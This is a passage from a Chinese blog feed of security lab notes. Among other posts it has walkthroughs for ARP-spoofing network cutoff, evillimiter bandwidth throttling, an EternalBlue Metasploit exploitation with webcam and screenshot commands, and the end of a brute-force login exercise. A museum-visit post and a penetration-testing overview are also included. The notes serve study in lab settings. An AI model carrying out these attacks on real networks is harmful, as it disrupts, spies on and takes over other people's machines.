爆破攻击页面，查看页面源码，发现对提交的用户名和密码内容使用了 <code>mysqli_real_escape_string</code> 函数，对特殊字符进行转义，从而防止了以 SQL 注入的方式登录，如图 4-1。同时，通过 <code>sleep(2)</code>，使登录失败后让页面延迟 2 秒响应，对暴力破解起到了一定的防御作用，如图 4-2</em></p><p><img src="/images/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/16"><em>图4-1</em></p><p><img src="/images/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/17"><em>图4-2</em></p><p><strong>II</strong>.<em>根据上述情况分析，防 SQL 注入并不能影响我们进行暴力破解，而登录失败的 2 秒延迟对暴力破解的影响也是微乎其微，所以我们这里直接使用 <code>Low</code> 级别的方式使用 Burpsuite 进行爆破即可。这里只展示最终结果，如图 4-3</em></p><p><img src="/images/Web%E7%88%86%E7%A0%B4%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/18"><em>图4-3</em></p><br><p>【转载文章】</p><p>【1】<a href="http://www.dengfm.com/15621247896045.html">邓大佬-|在线文档库</a></p>]]></content>
      
      
      <categories>
          
          <category> 网安笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>打卡——山东博物馆</title>
      <link href="/posts/45410"/>
      <url>/posts/45410</url>
      
        <content type="html"><![CDATA[<center><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=30031067&auto=0&height=66"></iframe></center><p><img src="/images/%E5%BD%B1%E8%A7%86%E5%89%A7%E7%85%A7/%E6%97%A0%E9%97%AE%E8%A5%BF%E4%B8%9C01.jpg"></p><br/><h3 id="介绍🔝"><a href="#介绍🔝" class="headerlink" title="介绍🔝"></a>介绍🔝</h3><ul><li>山东博物馆成立于1954年，是新中国成立后建立的第一座省级综合性地志博物馆。</li><li>历史文物14万余件，2012年，入选国家一级博物馆。</li><li>——更多详情百度百科[<a href="https://baike.baidu.com/item/%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/9588493?fr=aladdin">点击进入</a>]</li></ul><h3 id="位置🎪"><a href="#位置🎪" class="headerlink" title="位置🎪"></a>位置🎪</h3><p><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/01.jpg"></p><h3 id="布局✍"><a href="#布局✍" class="headerlink" title="布局✍"></a>布局✍</h3><p><em><strong>如下图1-1所示，馆内展厅</strong></em></p><p><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/02.jpg"><em>图1-1</em></p><p><font face="楷体">1F</font></p><ul><li><input checked="" disabled="" type="checkbox"> 1号展厅：<font color="blue"><strong>佛教造像艺术展</strong></font></li><li><input checked="" disabled="" type="checkbox"> 2号展厅：<font color="blue"><strong>汉代画像艺术展</strong></font></li></ul><p><font face="楷体">2F</font></p><ul><li><p><input checked="" disabled="" type="checkbox"> 6、7、8号展厅：<font color="blue"><strong>山东历史文化展</strong></font></p></li><li><p><input checked="" disabled="" type="checkbox"> 10号展厅：<font color="blue"><strong>鲁王-明朱檀墓出土文物展</strong></font></p></li><li><p><input checked="" disabled="" type="checkbox"> 9号展厅：<font color="blue"><strong>甲骨文化展、馆藏精品玉器展</strong></font></p></li><li><p><input checked="" disabled="" type="checkbox"> 11号展厅：<font color="blue"><strong>清初初期山水画展</strong></font></p></li><li><p><input checked="" disabled="" type="checkbox"> 12号展厅：<font color="blue"><strong>明清官窑瓷器展</strong></font></p></li></ul><p><font face="楷体">3F</font></p><ul><li><input checked="" disabled="" type="checkbox"> 14号展厅：<font color="blue"><strong>话说考古展</strong></font></li><li><input checked="" disabled="" type="checkbox"> 15号展厅：<font color="blue"><strong>山东考古成果展</strong></font></li><li><input checked="" disabled="" type="checkbox"> 16、17号展厅：<font color="blue"><strong>非洲野生动物大迁徙展</strong></font></li><li><input checked="" disabled="" type="checkbox"> 18号展厅：<font color="blue"><strong>山东龙——穿越白垩纪</strong></font></li><li><input checked="" disabled="" type="checkbox"> 19号展厅：<font color="blue"><strong>探寻神奇的矿物世界</strong></font></li><li><input checked="" disabled="" type="checkbox"> 20号展厅：<font color="blue"><strong>中国海洋贝类展</strong></font></li></ul><p><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/03.jpg"></p><table><thead><tr><th><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/04.1.jpg"><em>馆内大厅</em></th><th><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/04.2.jpg"><em>大厅</em></th><th><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/04.jpg"><em>大厅</em></th></tr></thead></table><h3 id="藏品👃"><a href="#藏品👃" class="headerlink" title="藏品👃"></a>藏品👃</h3><p><font  face="宋体"> <strong>#穿越千年的文物</strong></font></p><p><font color="red"  face="黑体">echo</font> <strong>“当你凝视千年之前的它的时候，或许它也在凝视千年之后的你”</strong> <font color="red"  face="黑体">&gt;打卡——山东博物馆.md</font></p><p><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/05.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/06.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/05.2.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/05.1.jpg"></p><p><font face="宋体"><strong>[前尘往事：”蝉冠菩萨像”，这尊东魏时期的佛像久经磨难，却微笑如一，非常精美，1994年被盗，至今未破案，最早流转于英国文物市场，菩萨像流失海外14年，在国际友人帮助下，经过中日双方多次谈判，2007年由日本美秀博物馆归还山东]</strong></font></p><p><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/07.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/08.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/09.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/10.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/11.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/12.jpg">  <img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/14.jpg"></p><br /><hr><p><font face="宋体"><strong>东平汉墓壁画</strong></font></p><p><font face="黑体">东平汉墓壁画是山东迄今发现年代最早、保存最完好、艺术水平最高的汉画作品。壁画色彩艳丽、线条灵动绝妙，不仅填补了我省汉代壁画的空白，在全国也较为罕见!</font></p><p><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/16.jpg"><em>复原图</em></p><table><thead><tr><th><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/17.jpg" alt="xxx"></th><th><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/18.jpg" alt="xxx"></th><th><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/19.jpg" alt="xxx"></th></tr></thead></table><p><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/19.1.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/20.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/21.jpg"></p><hr><br /><p><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/22.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/23.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/24.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/25.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/26.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/27.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/28.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/29.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/30.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/31.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/32.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/33.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/34.1.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/34.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/35.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/36.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/37.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/38.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/39.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/40.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/41.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/42.jpg"></p><table><thead><tr><th><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/43.jpg" alt="xxx"></th><th><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/44.jpg" alt="xxx"></th></tr></thead></table><br /><hr><p><font face="宋体"><strong>明朱檀墓出土文物展</strong></font></p><p><font face="黑体">在距今六百年前的邹鲁之地，曾生活过一位年轻的鲁王，也就是明朝开国皇帝朱元璋的第十子朱檀，明洪武三年(1370年)出生，两月后被封为鲁王，十五岁就藩兖州，此后兖州即升州为府，辖四州二十三县，朱檀自幼好诗书礼仪，礼贤下士，博学多识，颜得朱元璋喜爱，十九岁服丹药毒发伤目而亡，谥号”荒”。鲁荒王陵位于现山东省邹城与曲阜市交界的九龙山南麓。1970年至1971年，山东省博物馆主持对陵墓进行抢救性考古发掘。</font></p><p><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/45.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/46.jpg"></p><table><thead><tr><th><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/47.jpg"></th><th><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/48.jpg"></th><th><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/49.jpg"></th></tr></thead></table><p><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/50.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/51.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/53.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/52.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/54.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/55.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/56.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/57.jpg"><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/57.1.jpg"></p><hr><br /><p><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/58.jpg"></p><table><thead><tr><th><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/59.jpg"></th><th><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/60.jpg"></th></tr></thead></table><p><img src="/images/%E6%89%93%E5%8D%A1%E5%B1%B1%E4%B8%9C%E5%8D%9A%E7%89%A9%E9%A6%86/61.jpg"></p><br />]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>evillimiter限速</title>
      <link href="/posts/11350"/>
      <url>/posts/11350</url>
      
        <content type="html"><![CDATA[<br /><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>🧲攻击机：<code>Kali GNU/Linux Rolling   IP：10.10.10.100</code></li><li>🪦靶机：<code>Windows10 x64   IP:10.10.10.102</code></li></ul><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><ul><li><em>evillimiter一种无需物理或管理访问即可监视，分析和限制本地设备上的带宽（上传&#x2F;下载）的工具。evillimiter使用<code>ARP欺骗</code>和流量整形来限制网络上主机的带宽。</em></li></ul><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p><strong>One</strong>.<em>安装软件（略）</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bitbrute/evillimiter.git <span class="comment">#下载</span></span><br><span class="line"><span class="built_in">cd</span> evillimiter <span class="comment">#进入</span></span><br><span class="line">sudo python3 setup.py install <span class="comment">#安装 </span></span><br></pre></td></tr></table></figure><p><strong>Two</strong>.<em>进入软件<code>evillimiter</code></em></p><p><img src="/images/KALI%E4%BD%BF%E7%94%A8evillimiter%E9%99%90%E9%80%9F/01.png"></p><p><strong>Three</strong>.<em>扫描周围设备</em></p><p><img src="/images/KALI%E4%BD%BF%E7%94%A8evillimiter%E9%99%90%E9%80%9F/02.png"></p><p><strong>Four</strong>.<em>设置限速，限速为1kbit</em>🌩️</p><p><img src="/images/KALI%E4%BD%BF%E7%94%A8evillimiter%E9%99%90%E9%80%9F/03.png"></p><p><strong>Five</strong>.<em>查看靶机</em></p><p><img src="/images/KALI%E4%BD%BF%E7%94%A8evillimiter%E9%99%90%E9%80%9F/04.png"></p><p><strong>Six</strong>.<em>解除限速</em></p><p><img src="/images/KALI%E4%BD%BF%E7%94%A8evillimiter%E9%99%90%E9%80%9F/05.png"></p><p><strong>Seven</strong>.<em>再次查看靶机</em></p><p><img src="/images/KALI%E4%BD%BF%E7%94%A8evillimiter%E9%99%90%E9%80%9F/06.png"></p><br /><blockquote><p><strong>注：该文章中使用到的方法只用于学习交流，切勿用于非法途径！！！</strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网安笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KALI进行ARP断网攻击</title>
      <link href="/posts/35498"/>
      <url>/posts/35498</url>
      
        <content type="html"><![CDATA[<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>🥭攻击机：<code>Kali GNU/Linux Rolling   IP：10.10.10.100</code></li><li>🍑靶机：<code>Windows10 x64   IP:10.10.10.102</code></li></ul><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><ul><li><p><font face="黑体"><em>ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP&#x2F;IP协议栈中的底层协议，负责将某个IP地址解析成对应的MAC地址。而ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。这是一种“中间人”（MAN-IN-MIDDLE）攻击技术。</em></font></p></li><li><p><font face="宋体"><em>电脑遭受到典型的ARP攻击后会表现为：使用局域网时会突然掉线，过一段时间后又会恢复正常。比如客户端状态频频变红，用户频繁断网，IE浏览器频繁出错，以及一些常用软件出现故障等。如果局域网中是通过身份认证上网的，会突然出现可认证，但不能上网的现象（无法ping通网关），重启机器或在MS-DOS窗口下运行命令arp -d后，又可恢复上网。</em></font></p></li><li><p><font face="楷体"><em>ARP欺骗木马只需成功感染一台电脑，就可能导致整个局域网都无法上网，严重的甚至可能带来整个网络的瘫痪。该木马发作时除了会导致同一局域网内的其他用户上网出现时断时续的现象外，还会窃取用户密码。如盗取QQ密码、盗取各种网络游戏密码和账号去做金钱交易，盗窃网上银行账号来做非法交易活动等。</em></font></p></li></ul><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p><strong>One</strong>.<em>获取目标主机IP</em></p><p>注：<font face="楷体" color="green">使用Ettercap对内网进行扫描以获取主机IP和网关信息</font></p><p><img src="/images/KALI%E8%BF%9B%E8%A1%8CARP%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB/01.1.png"><img src="/images/KALI%E8%BF%9B%E8%A1%8CARP%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB/01.2.png"></p><p><strong>Two</strong>.<em>安装所需软件</em></p><p><img src="/images/KALI%E8%BF%9B%E8%A1%8CARP%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB/01.png"></p><p><strong>Three</strong>.<em>攻击演示</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">→  arpspoof [-I interface ] [-t target] host</span><br><span class="line">→  分别为网卡名、目标ip、网关</span><br></pre></td></tr></table></figure><p><img src="/images/KALI%E8%BF%9B%E8%A1%8CARP%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB/02.png"></p><p><strong>Four</strong>.<em>查看靶机</em></p><p><img src="/images/KALI%E8%BF%9B%E8%A1%8CARP%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB/03.png" alt="image-20221003212826560"></p><br /><blockquote><p><strong>注：该文章中使用到的方法只用于学习交流，切勿用于非法途径！！！</strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网安笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝复现</title>
      <link href="/posts/18367"/>
      <url>/posts/18367</url>
      
        <content type="html"><![CDATA[<br /><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>🥭攻击机：<code>Kali GNU/Linux Rolling   IP：10.10.10.100</code></li><li>🍑靶机：<code>Windows7 x64   IP:10.10.10.109</code><ul><li>🫒<em>win7关闭防火墙开启445端口</em></li></ul></li></ul><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p><strong>I</strong>.<em>分别查看win7和kali地址<code>如图1-1</code></em></p><p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/01.png"><em>图1-1</em></p><p><strong>II</strong>.<em>打开msf工具<code>如图1-2</code></em></p><p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/02.png"><em>图1-2</em></p><p><strong>III</strong>.<em>命令搜索ms17_010<code>如图1-3</code></em></p><p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/03.png"><em>图1-3</em></p><p><strong>IV</strong>.<em>选择模块和设置条件</em></p><p><em>01.使用use来学则第1个模块和设置靶机IP地址<code>如图1-4</code></em></p><p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/04.png"><em>图1-4</em></p><p><strong>V</strong>.<em>开始渗透<code>run</code>或<code>exploit</code> <code>如图1-5</code></em></p><p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/05.png"><em>图1-5</em></p><p><strong>VI</strong>.<em>一些操作</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">screenshot      //截取屏幕</span><br><span class="line">webcam_stream//开启摄像头</span><br></pre></td></tr></table></figure><p>🥕<em>使用shell命令，可以进入windows命令行</em></p><ul><li>​创建用户并远程登录<code>如图1-6</code></li></ul><p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/06.png"><em>图1-6</em></p><ul><li>启动远程桌面，在新的终端连接远程桌面<code>如图1-7、1-8</code></li></ul><p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/07.png"><em>图1-7</em></p><p><img src="/images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/08.png"><em>图1-8</em></p>]]></content>
      
      
      <categories>
          
          <category> 网安笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web渗透概述</title>
      <link href="/posts/41383"/>
      <url>/posts/41383</url>
      
        <content type="html"><![CDATA[<br /><br /><h1 id="渗透测试概述"><a href="#渗透测试概述" class="headerlink" title="渗透测试概述"></a>渗透测试概述</h1><ul><li><font face="黑体">渗透测试 (penetration test)并没有一个标准的定义，国外一些安全组织达成共识的通用说法是：渗透测试是通过模拟恶意黑客的攻击方法，来评估计算机网络系统安全的一种评估方法。这个过程包括对系统的任何弱点、技术缺陷或漏洞的主动分析，这个分析是从一个攻击者可能存在的位置来进行的，并且从这个位置有条件主动利用安全漏洞。</font>　</li><li><font face="黑体">假设某公司的运维怀疑公司信息系统存在安全隐患，但是由于不具备专业安全攻防的能力，具体存在哪些隐患并不清楚。这时就可以委托安全公司对本公司信息系统进行渗透测试。换句话说，进行渗透测试的团队会把自己模拟成黑客，来对目标信息系统进行各种形式的攻击（当然，这种攻击行为是合法的，因为提前获得了被攻击方的授权），最后把攻击的过程和发现的漏洞，以及漏洞修复方案提交给客户，让客户可以完善自己信息系统的安全性。　</font>　</li><li><font face="黑体">在信息安全的知识体系中，渗透测试是占比例最高的一个部分，也是对个人技术能力和领悟能力要求最高的一个部分。渗透测试的过程中不能仅仅只靠学到的固定的攻击方式来进行测试，还需要测试工程师能够根据不同的目标环境，进行各种常规或非常规的方法来尝试；攻击对象和攻击切入点也可能不仅仅是计算机系统，甚至可能是直接从计算机的使用者来进行切入（社会工程学）。</font></li></ul><h2 id="渗透测试的分类"><a href="#渗透测试的分类" class="headerlink" title="渗透测试的分类"></a>渗透测试的分类</h2><blockquote><p>渗透测试一般分为黑盒测试、白盒测试和灰盒测试。不同的客户可能会针对不同的需求选择不同的测试方式。</p></blockquote><ul><li>黑盒测试：是指测试者对目标信息系统一无所知，需要从最开始的信息收集开始一步一步来进行，难度较大，对测试者能力要求较高。但是由于客户也无法得知测试者会以什么方式来攻击和入侵，所以能够检测网络中的应急和入侵防御系统是否有效。这种测试方式成本也较高。</li><li>白盒测试：是指测试者提前已经被告知了关于目标信息系统的各种信息，可以更快速的来进行测试，成本较低，一般是用于企业内部人员的测试或日常漏扫巡检。</li><li>灰盒测试：白盒测试和黑盒测试基本类型的组合，它可以提供对目标系统更加深入和全面的安全审查。组合之后的好处就是能够同时发挥两种渗透测试方法的各自优势。在采用灰盒测试方法的外部渗透攻击场景中，渗透测试者也类似地需要从外部逐步渗透进目标网络，但他所拥有的目标网络底层拓扑与架构将有助于更好地决策攻击途径与方法，从而达到更好的渗透测试效果。</li></ul><h2 id="渗透测试的流程"><a href="#渗透测试的流程" class="headerlink" title="渗透测试的流程"></a>渗透测试的流程</h2><ul><li><strong>前期交互</strong>：在进行渗透测试之前，渗透测试团队需要与客户就渗透测试目标、渗透测试范围、渗透测试方式（白盒、黑盒、灰盒以及是否涉及社会工程学、DDOS等）、服务合同等细节进行商议，达成一致协议。</li><li><strong>信息收集</strong>：在确定了渗透测试目标以及范围之后，接下来就需要进入信息收集阶段。在这个阶段，渗透测试人员需要使用各种公开的资源尽可能的获取与测试目标相关的信息。可以借助各种渠道来收集目标的相关信息，包括公开渠道和非公开渠道。信息收集是为了后面制定攻击方案和计划的重要前提</li><li><strong>威胁建模</strong>：在这个阶段渗透测试团队需要聚集在一起就获取到的信息进行分析并且做出攻击的规划。这是渗透测试过程中非常重要但是又很容易被忽略的一个关键点。在这个过程中必须要理清思路，确定出最有效、最可行的攻击方案。总之，该阶段就是根据前面收集到的信息制定最可行的攻击计划</li><li><strong>漏洞分析</strong>：有了攻击计划，但具体从哪里实施整个计划的切入，需要一个攻击点。所有的攻击和入侵都是基于目标信息系统的漏洞的，所以该阶段需要测试者去尽可能的挖掘出系统中的漏洞。而且不仅需要验证系统是否存在已知的漏洞，同时也需要去挖掘系统一些潜在的漏洞，并且开发出相应的漏洞利用代码。</li><li><strong>渗透攻击</strong>：该阶段就是真正的实施攻击了。根据前面制定的计划，找到的攻击切入点，一步步实施攻击和入侵，以获得目标信息系统最高管理权为最终目标</li><li><strong>后渗透攻击</strong>：完成攻击后，测试者已经获取了目标系统的最高管理权，但是真正能体现测试价值的往往是后渗透阶段。该阶段测试者需要利用各种手段来找到目标信息系统中的高价值资产，并找到能影响资产价值的手段，实施对目标人的打击和破坏。该阶段中还会留下后门，实现权限维持和长期控制</li><li><strong>渗透报告</strong>：整个渗透测试的过程最终需要以书面文档的形式向客户提交，这份报告也就是我们常说的渗透测试报告。这份报告涵盖了之前所有阶段中渗透测试团队所获取的到各种有价值信息以及探测和挖掘出来的相关安全漏洞、成功攻击的过程，以及对业务造成的影响后果分析。同时在这个阶段也要对系统中存在的脆弱环节、存在的安全问题给出修复建议。</li></ul><h1 id="Web渗透概述"><a href="#Web渗透概述" class="headerlink" title="Web渗透概述"></a>Web渗透概述</h1><blockquote><p>Web 已经在企业信息化、电子商务、电子政务中等得到广泛的应用，Web 的迅速发展同时，也带来了众多的安全威胁。</p><p>网络攻击重心已转向应用层， Web 已成为黑客首选攻击目标， 针对 